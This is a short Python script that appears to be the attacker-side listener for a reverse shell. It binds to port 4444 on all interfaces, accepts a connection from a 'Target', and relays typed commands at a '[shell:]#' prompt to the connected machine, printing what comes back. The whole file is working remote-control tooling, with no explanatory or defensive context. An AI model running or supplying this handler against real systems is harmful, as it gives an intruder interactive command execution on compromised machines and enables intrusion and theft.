import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = ''  # 0.0.0.0
port = 4444

try:
    s.bind((host, port))
except socket.error as msg:
    print('Bind failed. Error: ', str(msg))
    sys.exit()

s.listen(10)
print('Listening...\n')

conn, addr = s.accept()
ip_target, port_target = addr
print("Target ====> %s:%s\n" % (ip_target, port_target))


def exitFunc():
    conn.close()
    s.close()
    sys.exit()

while True:
    try:
        command = input("\n[shell:]# ")
        if command == "exit":
            conn.send(b'%s' % str(command).encode('utf-8'))
            print("\nGoodbye.")
            exitFunc()
        elif command == '':
            print("\nShell must have commands!")
        else:
            conn.send(b'%s' % str(command).encode('utf-8'))
            data = str(conn.recv(99999), 'utf-8')
            print("\n" + data)
    except socket.error as msg:
        print("Error: ", msg)
        exitFunc()
